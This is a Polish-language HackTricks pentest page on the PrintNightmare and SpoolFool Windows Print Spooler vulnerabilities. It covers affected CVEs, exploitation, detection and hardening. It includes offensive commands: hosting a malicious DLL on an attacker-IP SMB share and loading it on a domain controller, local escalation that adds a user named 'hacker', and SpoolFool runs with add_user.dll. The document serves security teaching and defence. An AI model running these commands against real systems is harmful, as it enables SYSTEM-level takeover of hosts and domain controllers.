# PrintNightmare (RCE/LPE w usłudze Windows Print Spooler)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare to zbiorcza nazwa rodziny luk w usłudze Windows **Print Spooler**, które umożliwiają **wykonanie dowolnego kodu jako SYSTEM**, a gdy spooler jest dostępny przez RPC — **zdalne wykonanie kodu (RCE) na kontrolerach domeny i serwerach plików**. Najczęściej wykorzystywane CVE to **CVE-2021-1675** (początkowo sklasyfikowane jako LPE) i **CVE-2021-34527** (pełne RCE). Późniejsze problemy, takie jak **CVE-2021-34481 („Point & Print”)** i **CVE-2022-21999 („SpoolFool”)**, dowodzą, że powierzchnia ataku wciąż jest daleka od zabezpieczenia.

Jeśli szukasz **wymuszania uwierzytelnienia / relay** za pośrednictwem spoolera, a nie **RCE/LPE opartego na sterownikach**, zajrzyj na [tę stronę o nadużyciach związanych z wymuszaniem uwierzytelnienia przez drukarki](printers-spooler-service-abuse.md). Ta strona skupia się na **ładowaniu sterowników / DLL jako SYSTEM**.

---

## 1. Podatne komponenty i CVE

| Rok | CVE | Krótka nazwa | Prymityw | Uwagi |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Załatana w czerwcowej aktualizacji zbiorczej z 2021 r., ale obejście umożliwiło CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` umożliwia uwierzytelnionym użytkownikom załadowanie DLL sterownika ze zdalnego udziału; po sierpniu 2021 r. zwykle wymaga to osłabienia zasad Point & Print|
|2021|CVE-2021-34481|“Point & Print”|LPE|Instalacja niepodpisanych sterowników przez użytkowników niebędących administratorami|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Tworzenie dowolnych katalogów → umieszczanie DLL — działa po poprawkach z 2021 r.|

Wszystkie te luki wykorzystują jedną z **metod RPC MS-RPRN / MS-PAR** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) lub relacje zaufania w ramach **Point & Print**.

## 2. Techniki exploita

### 2.1 Zdalne przejęcie kontrolera domeny (CVE-2021-34527)

Uwierzytelniony, ale **nieuprzywilejowany** użytkownik domeny może uruchamiać dowolne DLL jako **NT AUTHORITY\SYSTEM** na zdalnym spoolerze (często na kontrolerze domeny), wykonując następujące czynności:

```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
       -f \
       '\\attacker_IP\share\evil.dll'
```

Popularne PoC to **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) oraz moduły `misc::printnightmare / lsa::addsid` Benjamina Delpy’ego w **mimikatz**.

### 2.2 Lokalne podniesienie uprawnień (dowolny obsługiwany Windows, 2021–2024)

To samo API można wywołać **lokalnie**, aby załadować sterownik z `C:\Windows\System32\spool\drivers\x64\3\` i uzyskać uprawnienia SYSTEM:

```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```

### 2.3 Współczesna analiza hostów z zainstalowanymi aktualizacjami

Na w pełni zaktualizowanym hoście publiczne PoC PrintNightmare często zawodzą, ponieważ system Windows domyślnie zezwala na instalowanie sterowników drukarek **wyłącznie administratorom** (`RestrictDriverInstallationToAdministrators=1` od 10 sierpnia 2021 r.). Zanim uruchomisz exploit przeciwko celowi, najpierw sprawdź, czy w środowisku nie cofnięto tej zmiany zabezpieczeń na potrzeby starszych wdrożeń drukarek:<sup>[[3]](#references)</sup>

```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```

Dwie najciekawsze słabe wartości to zazwyczaj:<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Z Linuksa szybko potwierdź, że cel udostępnia odpowiednie interfejsy RPC drukowania, zanim uruchomisz PoC:

```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```

Niektóre nowsze publicznie dostępne narzędzia oferują również bezpieczniejszy przepływ pracy **sprawdzania/wyświetlania listy** przed wysłaniem biblioteki DLL:

```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```

> Jeśli jako użytkownik z niskimi uprawnieniami otrzymujesz `RPC_E_ACCESS_DENIED` (`0x8001011b`), zwykle oznacza to domyślne ustawienia wprowadzone po 2021 r., a nie problem z transportem.

> W systemie Windows 11 22H2+ i nowszych kompilacjach klienckich drukowanie zdalne domyślnie korzysta z **RPC over TCP**, a **RPC over named pipes** (`\PIPE\spoolss`) jest wyłączone, chyba że zostanie jawnie ponownie włączone. Niektóre starsze PoC i notatki z laboratoriów nadal zakładają, że named pipe jest dostępny.<sup>[[4]](#references)</sup>

### 2.4 Nadużywanie Package Point & Print w „załatanych” sieciach

Wiele środowisk korporacyjnych pozostało **podatnych z powodu konfiguracji zasad** po oryginalnych poprawkach z 2021 r., ponieważ procedury helpdesku lub serwerów druku nadal wymagały, by użytkownicy bez uprawnień administratora instalowali lub aktualizowali sterowniki. W praktyce scenariusz ofensywny wygląda tak:

- Jeśli monity zabezpieczeń są całkowicie wyłączone, **klasyczny PrintNightmare z dowolną biblioteką DLL** nadal jest najkrótszą drogą.
- Jeśli włączono `Only use Package Point and Print`, zwykle trzeba przejść na ścieżkę wykorzystującą **podpisany sterownik obsługujący pakiety**, zamiast bezpośrednio umieszczać surową bibliotekę DLL.<sup>[[3]](#references)</sup>
- Badania z 2024 r. wykazały, że **`Package Point and Print - Approved servers` samo w sobie nie stanowi nieprzekraczalnej granicy zaufania**: jeśli atakujący może podszyć się pod zatwierdzony serwer druku lub przejąć rozpoznawanie jego nazwy, ofiary nadal mogą zostać przekierowane na złośliwy serwer spełniający wymogi zasad.<sup>[[4]](#references)</sup>
- Nawet połączenie wzmacniania zabezpieczeń UNC z wymuszonym RPC over SMB może być zawodne, ponieważ nowoczesne klienty mogą **przełączyć się na RPC over TCP**.<sup>[[4]](#references)</sup>

Dlatego współczesne exploity w stylu PrintNightmare częściej polegają na **nadużywaniu korporacyjnych zasad wdrażania drukarek** niż na odtwarzaniu oryginalnego PoC z 2021 r. bez zmian.

### 2.5 SpoolFool (CVE-2022-21999) – omijanie poprawek z 2021 r.

Poprawki Microsoftu z 2021 r. zablokowały zdalne ładowanie sterowników, ale **nie zaostrzyły uprawnień do katalogów**. SpoolFool nadużywa parametru `SpoolDirectory`, aby utworzyć dowolny katalog w `C:\Windows\System32\spool\drivers\`, umieścić w nim bibliotekę DLL z payloadem i wymusić jej załadowanie przez bufor wydruku:<sup>[[2]](#references)</sup>

```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```

> Exploit działa na w pełni zaktualizowanych systemach Windows 7 → Windows 11 i Server 2012R2 → 2022, sprzed aktualizacji z lutego 2022 r.<sup>[[2]](#references)</sup>

---

## 3. Wykrywanie i wyszukiwanie zagrożeń

* **Dzienniki PrintService** – włącz kanał *Microsoft-Windows-PrintService/Operational* i monitoruj **Event ID 316** (dodanie/aktualizacja sterownika, zwykle zawiera nazwy bibliotek DLL) zarówno przy udanych, jak i nieudanych próbach. Połącz to z **Event ID 808/811**, które wskazują na podejrzane błędy ładowania modułów/sterowników przez spooler.
* **Sysmon** – `Event ID 7` (załadowanie obrazu) lub `11/23` (zapis/usunięcie pliku) w lokalizacji `C:\Windows\System32\spool\drivers\*`, gdy procesem nadrzędnym jest **spoolsv.exe**.
* **Łańcuch procesów** – generuj alert za każdym razem, gdy **spoolsv.exe** uruchamia `cmd.exe`, `rundll32.exe`, PowerShell lub dowolny nieoczekiwany, niepodpisany proces potomny.
* **Telemetria sieciowa** – nieoczekiwane pobieranie przez SMB z udziałów kontrolowanych przez atakującego przez **spoolsv.exe** lub nietypowy ruch RPC związany z drukarkami z serwerów, które nie powinny pełnić roli serwerów druku, to ważne sygnały.

## 4. Ograniczanie ryzyka i wzmacnianie zabezpieczeń

1. **Zainstaluj poprawki!** – zastosuj najnowszą aktualizację zbiorczą na każdym hoście Windows z zainstalowaną usługą Print Spooler.
2. **Wyłącz spooler tam, gdzie nie jest potrzebny**, zwłaszcza na kontrolerach domeny:
   ```powershell
   Stop-Service Spooler -Force
   Set-Service Spooler -StartupType Disabled
   ```
3. **Blokuj połączenia zdalne**, jednocześnie zezwalając na drukowanie lokalne – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Ogranicz Point & Print do administratorów**, ustawiając:
   ```cmd
   reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
           /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
   ```
   Szczegółowe wskazówki w Microsoft KB5005652<sup>[[1]](#references)</sup>
5. Jeśli wymagania biznesowe wymuszają ustawienie `RestrictDriverInstallationToAdministrators=0`, traktuj każdą inną politykę drukarek wyłącznie jako **częściowe zabezpieczenie**. Co najmniej preferuj **sterowniki obsługujące pakiety**, włącz **Only use Package Point and Print** i ogranicz **Package Point and Print - Approved servers** do jawnie wskazanych serwerów wydruku w lesie.<sup>[[3]](#references)</sup>
6. **Nie wycofuj ochrony prywatności RPC drukarek** tylko po to, by naprawić niedziałające mapowania drukarek. Środowiska, w których ustawiono `RpcAuthnLevelPrivacyEnabled=0`, cofają wzmocnienia zabezpieczeń wprowadzone dla **CVE-2021-1678** i zwykle wymagają dokładniejszej analizy podczas testów bezpieczeństwa.<sup>[[4]](#references)</sup>

---

## 5. Powiązane badania / narzędzia

* Moduły `printnightmare` dla [mimikatz](https://github.com/gentilkiwi/mimikatz/tree/master/modules)
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – standardowa implementacja Impacket z trybami `-check`, `-list` i `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper z wbudowanym dostarczaniem przez SMB, obsługą wielu celów oraz trybami `MS-RPRN` i `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – nadużycie własnego podatnego sterownika drukarki za pośrednictwem package Point & Print
* Exploit i opis SpoolFool
* Mikropoprawki 0patch dla SpoolFool i innych błędów spoolera

Jeśli chcesz **wymusić uwierzytelnienie** za pomocą spoolera zamiast ładować sterownik, przejdź do [nadużywania usługi spoolera drukarek](printers-spooler-service-abuse.md).

---

## References

- [1] [Microsoft – KB5005652: Zarządzanie nowym domyślnym zachowaniem instalacji sterowników Point & Print](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – Praktyczny przewodnik po PrintNightmare w 2024 roku](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – PrintNightmare jeszcze się nie skończył](https://itm4n.github.io/printnightmare-not-over/)
{{#include ../../banners/hacktricks-training.md}}
